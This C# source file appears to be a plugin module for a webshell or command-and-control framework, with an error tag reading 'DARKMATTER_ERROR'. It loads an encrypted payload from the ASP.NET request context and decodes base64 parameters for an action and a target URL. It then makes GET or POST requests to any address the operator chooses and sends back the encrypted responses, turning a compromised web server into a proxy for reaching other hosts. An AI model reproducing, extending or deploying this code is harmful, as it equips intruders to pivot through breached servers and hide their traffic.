using System;
using System.Web;
using System.IO;
using System.Net;
using System.Text;
using System.Collections.Generic;
using System.Reflection;

public class http
{
    private Dictionary<string, string> fnParseParams(string szParam)
    {
        Dictionary<string, string> dic = new Dictionary<string, string>();
        if (string.IsNullOrEmpty(szParam))
            return dic;

        string[] pairs = szParam.Split('&');
        foreach (string szPair in pairs)
        {
            int nIdx = szPair.IndexOf("=");
            if (nIdx > 0)
                dic[szPair.Substring(0, nIdx).Trim()] = szPair.Substring(nIdx + 1).Trim();
        }

        return dic;
    }

    private string fnB64Encode(string szInput) => Convert.ToBase64String(Encoding.UTF8.GetBytes(szInput));
    private string fnB64Decode(string szInput) => Encoding.UTF8.GetString(Convert.FromBase64String(szInput));

    private void fnWriteOutput(object driver, HttpResponse response, byte[] abOutput)
    {
        var cryptMethod = driver.GetType().GetMethod("Crypt", new Type[] { typeof(byte[]), typeof(int) });
        byte[] abEncryptedResp = (byte[])cryptMethod.Invoke(driver, new object[] { abOutput, 1 });

        response.Clear();
        response.ContentType = "application/octet-stream";
        response.BinaryWrite(abEncryptedResp);
    }

    private string fnEscapeJson(string str)
    {
        if (string.IsNullOrEmpty(str)) return "";
        return str.Replace("\\", "\\\\")
                  .Replace("\"", "\\\"")
                  .Replace("\b", "\\b")
                  .Replace("\f", "\\f")
                  .Replace("\n", "\\n")
                  .Replace("\r", "\\r")
                  .Replace("\t", "\\t");
    }

    private string[] fnExecuteHttp(string szMethod, string szUrl, string szPostData)
    {
        string[] result = new string[] { "0", "" }; // [0] = HTTP Code, [1] = Body / Error Msg
        
        try
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(szUrl);
            request.Method = szMethod.ToUpper();
            request.Timeout = 15000;
            request.ReadWriteTimeout = 15000;
            request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
            request.KeepAlive = false;

            if ("POST".Equals(szMethod, StringComparison.OrdinalIgnoreCase))
            {
                request.ContentType = "application/x-www-form-urlencoded";
                if (szPostData != null)
                {
                    byte[] postBytes = Encoding.UTF8.GetBytes(szPostData);
                    request.ContentLength = postBytes.Length;
                    using (Stream os = request.GetRequestStream())
                    {
                        os.Write(postBytes, 0, postBytes.Length);
                    }
                }
                else
                {
                    request.ContentLength = 0;
                }
            }

            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            {
                result[0] = ((int)response.StatusCode).ToString();
                using (StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.UTF8))
                {
                    result[1] = reader.ReadToEnd();
                }
            }
        }
        catch (WebException wex)
        {
            if (wex.Response != null)
            {
                using (HttpWebResponse errorResponse = (HttpWebResponse)wex.Response)
                {
                    result[0] = ((int)errorResponse.StatusCode).ToString();
                    using (StreamReader reader = new StreamReader(errorResponse.GetResponseStream(), Encoding.UTF8))
                    {
                        result[1] = reader.ReadToEnd();
                    }
                }
            }
            else
            {
                result[0] = "500";
                result[1] = wex.Message;
            }
        }
        catch (Exception ex)
        {
            result[0] = "500";
            result[1] = ex.Message;
        }

        return result;
    }

    public bool Run()
    {
        HttpContext context = HttpContext.Current;
        if (context == null)
            return false;

        HttpRequest request = context.Request;
        HttpResponse response = context.Response;

        try
        {
            byte[] abPayload = (byte[])context.Items["payload"];
            object driver = context.Items["driver"];
            int nDllLength = (int)context.Items["len"];

            if (abPayload == null || driver == null)
            {
                response.Write("PAYLOAD_ERROR: Missing attributes from context.");
                return false;
            }

            int nParamOffset = nDllLength + 4;
            int nParamLength = abPayload.Length - nParamOffset;
            string szParam = Encoding.UTF8.GetString(abPayload, nParamOffset, nParamLength).Trim();

            Dictionary<string, string> dic = fnParseParams(szParam);

            string szAction = dic.ContainsKey("z0") ? fnB64Decode(dic["z0"]).Trim() : "";
            
            string szStatus = "error";
            string szHttpCode = "null";
            string szDataResult = "";

            if (szAction.Equals("get", StringComparison.OrdinalIgnoreCase))
            {
                if (!dic.ContainsKey("z1"))
                {
                    szDataResult = "Missing URL";
                }
                else
                {
                    string szURL = fnB64Decode(dic["z1"]).Trim();
                    string[] httpRes = fnExecuteHttp("GET", szURL, null);
                    szStatus = "ok";
                    szHttpCode = httpRes[0];
                    szDataResult = httpRes[1];
                }
            }
            else if (szAction.Equals("post", StringComparison.OrdinalIgnoreCase))
            {
                if (!dic.ContainsKey("z1"))
                {
                    szDataResult = "Missing URL";
                }
                else
                {
                    string szURL = fnB64Decode(dic["z1"]).Trim();
                    string szPostData = dic.ContainsKey("z2") ? fnB64Decode(dic["z2"]).Trim() : "";
                    string[] httpRes = fnExecuteHttp("POST", szURL, szPostData);
                    szStatus = "ok";
                    szHttpCode = httpRes[0];
                    szDataResult = httpRes[1];
                }
            }
            else
            {
                szDataResult = "Invalid action";
            }

            StringBuilder sb = new StringBuilder();
            sb.Append("{\"status\":\"" + szStatus + "\",")
              .Append("\"action\":\"" + fnEscapeJson(szAction) + "\",")
              .Append("\"http_code\":" + szHttpCode + ",")
              .Append("\"data\":\"" + fnEscapeJson(szDataResult) + "\"}");

            fnWriteOutput(driver, response, Encoding.UTF8.GetBytes(sb.ToString()));
        }
        catch (Exception ex)
        {
            response.Write("DARKMATTER_ERROR: " + ex.Message);
        }

        return true;
    }
}